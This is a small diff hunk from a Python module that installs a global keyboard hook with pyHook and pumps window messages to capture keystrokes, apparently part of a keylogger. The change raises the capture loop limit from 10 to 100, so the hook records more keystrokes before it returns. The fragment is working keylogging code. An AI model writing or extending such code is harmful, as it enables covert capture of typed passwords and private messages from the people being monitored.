@@ -78,7 +78,7 @@ def run(**args):
     kl         = pyHook.HookManager()
     kl.KeyDown = KeyStroke
     kl.HookKeyboard()
-    while num < 10:
+    while num < 100:
         pythoncom.PumpWaitingMessages()
     return s
 	
